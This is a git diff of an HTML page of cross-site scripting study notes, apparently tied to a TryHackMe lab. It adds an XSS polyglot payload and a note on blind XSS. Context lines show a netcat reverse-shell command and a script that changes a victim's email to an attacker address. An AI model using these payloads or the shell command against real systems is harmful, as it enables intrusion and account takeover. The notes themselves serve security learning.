@@ -169,7 +169,7 @@ Cross-Site Scripting, better known as XSS in the cybersecurity community, is cla
 
       </ol>
       <ol><b>Blind XSS</b>
-        
+        <p>Same as stored XSS</p>
       </ol>
     </p>
   </div>
@@ -260,6 +260,8 @@ nc -e /bin/sh 10.20.14 8080<br>
       <b>Business Logic:</b>
       <pre>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</pre>
       <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS Cheat Sheet</a>
+      <pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</pre>
+      <p><b>***</b> View source code and try diffrent methon.</p>
     </P>
 </div>
    <!-- Exploitation section end here  -->
